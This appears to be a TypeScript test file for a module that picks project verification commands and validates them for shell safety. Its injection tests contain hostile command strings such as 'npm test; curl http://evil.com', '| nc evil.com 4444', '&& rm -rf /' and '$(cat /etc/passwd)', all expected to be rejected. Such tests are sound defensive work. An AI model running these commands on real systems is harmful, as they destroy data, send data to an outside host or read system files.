import test from 'node:test';
import assert from 'node:assert/strict';
import {
  chooseAutoVerificationCommand,
  resolveVerificationPlan,
  isVerificationCommandShellSafe,
} from '../lib/hydra-verification.ts';

test('chooseAutoVerificationCommand prefers package typecheck script', () => {
  const selected = chooseAutoVerificationCommand({
    npmScripts: { typecheck: 'tsc --noEmit', verify: 'npm run lint' },
    hasTypeScriptConfig: true,
  });

  assert.deepEqual(selected, {
    command: 'npm run typecheck',
    reason: 'Detected package.json script: typecheck',
  });
});

test('chooseAutoVerificationCommand falls back to language defaults', () => {
  const rustSelected = chooseAutoVerificationCommand({
    npmScripts: {},
    hasCargoToml: true,
  });
  assert.deepEqual(rustSelected, {
    command: 'cargo check',
    reason: 'Detected Cargo.toml',
  });

  const goSelected = chooseAutoVerificationCommand({
    npmScripts: {},
    hasGoMod: true,
  });
  assert.deepEqual(goSelected, {
    command: 'go test ./...',
    reason: 'Detected go.mod',
  });
});

test('chooseAutoVerificationCommand uses npm test when test script exists', () => {
  const selected = chooseAutoVerificationCommand({
    npmScripts: { test: 'node --test' },
  });

  assert.deepEqual(selected, {
    command: 'npm test',
    reason: 'Detected package.json script: test',
  });
});

test('chooseAutoVerificationCommand skips npm-init placeholder test script', () => {
  const selected = chooseAutoVerificationCommand({
    npmScripts: { test: 'echo "Error: no test specified" && exit 1' },
  });

  assert.equal(selected, null);
});

test('resolveVerificationPlan uses explicit config command', () => {
  const plan = resolveVerificationPlan(
    'unused',
    { verification: { onTaskDone: true, command: 'npm run verify', timeoutMs: 45000 } },
    null,
  );

  assert.equal(plan.enabled, true);
  assert.equal(plan.command, 'npm run verify');
  assert.equal(plan.source, 'config');
  assert.equal(plan.timeoutMs, 45000);
});

test('resolveVerificationPlan disables when onTaskDone is false', () => {
  const plan = resolveVerificationPlan(
    'unused',
    { verification: { onTaskDone: false, command: 'auto', timeoutMs: 60000 } },
    null,
  );

  assert.equal(plan.enabled, false);
  assert.match(plan.reason, /onTaskDone/i);
});

test('resolveVerificationPlan supports disabled command aliases', () => {
  const plan = resolveVerificationPlan(
    'unused',
    { verification: { onTaskDone: true, command: 'off', timeoutMs: 60000 } },
    null,
  );

  assert.equal(plan.enabled, false);
  assert.equal(plan.command, '');
  assert.equal(plan.source, 'config');
});

test('resolveVerificationPlan returns disabled auto plan when no signal matches', () => {
  const plan = resolveVerificationPlan(
    'unused',
    { verification: { onTaskDone: true, command: 'auto', timeoutMs: 60000 } },
    null,
  );

  assert.equal(plan.enabled, false);
  assert.equal(plan.command, '');
  assert.equal(plan.source, 'auto');
  assert.match(plan.reason, /No project-specific verification command/i);
});

test('isVerificationCommandShellSafe accepts well-formed commands', () => {
  assert.equal(isVerificationCommandShellSafe('npm test'), true);
  assert.equal(isVerificationCommandShellSafe('npm run verify'), true);
  assert.equal(isVerificationCommandShellSafe('cargo check'), true);
  assert.equal(isVerificationCommandShellSafe('go test ./...'), true);
  assert.equal(isVerificationCommandShellSafe('python -m pytest -q'), true);
  assert.equal(isVerificationCommandShellSafe('npx tsc --noEmit'), true);
  assert.equal(isVerificationCommandShellSafe('node --test'), true);
});

test('isVerificationCommandShellSafe rejects shell injection characters', () => {
  assert.equal(isVerificationCommandShellSafe('npm test; curl http://evil.com'), false);
  assert.equal(isVerificationCommandShellSafe('npm test && rm -rf /'), false);
  assert.equal(isVerificationCommandShellSafe('npm test | nc evil.com 4444'), false);
  assert.equal(isVerificationCommandShellSafe('npm test `whoami`'), false);
  assert.equal(isVerificationCommandShellSafe('npm test $(cat /etc/passwd)'), false);
  assert.equal(isVerificationCommandShellSafe('npm test > /tmp/out'), false);
  assert.equal(isVerificationCommandShellSafe('npm test < /etc/passwd'), false);
});

test('isVerificationCommandShellSafe rejects empty or non-string input', () => {
  assert.equal(isVerificationCommandShellSafe('' as string), false);
  assert.equal(isVerificationCommandShellSafe(null as unknown as string), false);
  assert.equal(isVerificationCommandShellSafe(undefined as unknown as string), false);
  assert.equal(isVerificationCommandShellSafe(42 as unknown as string), false);
});

test('resolveVerificationPlan rejects unsafe config commands', () => {
  const plan = resolveVerificationPlan(
    'unused',
    { verification: { onTaskDone: true, command: 'npm test; curl evil.com', timeoutMs: 60000 } },
    null,
  );

  assert.equal(plan.enabled, false);
  assert.equal(plan.command, '');
  assert.match(plan.reason, /unsafe characters/i);
});

test('resolveVerificationPlan allows safe config commands', () => {
  const plan = resolveVerificationPlan(
    'unused',
    { verification: { onTaskDone: true, command: 'npm run lint', timeoutMs: 60000 } },
    null,
  );

  assert.equal(plan.enabled, true);
  assert.equal(plan.command, 'npm run lint');
});
